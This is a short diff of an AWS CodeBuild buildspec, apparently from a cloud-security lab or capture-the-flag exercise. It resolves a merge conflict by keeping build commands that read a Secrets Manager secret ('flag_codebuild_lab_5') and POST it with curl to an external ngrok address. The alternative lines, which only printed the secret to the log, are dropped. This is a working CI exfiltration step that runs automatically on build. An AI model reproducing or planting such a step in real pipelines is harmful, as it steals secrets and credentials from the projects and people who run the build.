@@ -4,12 +4,7 @@ phases:
   build:
     commands:
       - echo "=== START ==="
-<<<<<<< HEAD
       - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
       - curl -X POST https://eeab-47-59-37-247.ngrok-free.app --data "flag=$FLAG"
-=======
-      - aws sts get-caller-identity
-      - echo "=== FLAG ==="
-      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text
->>>>>>> 307afb540844152d6a7139c7afe7819661941008
       - echo "=== END ==="
+
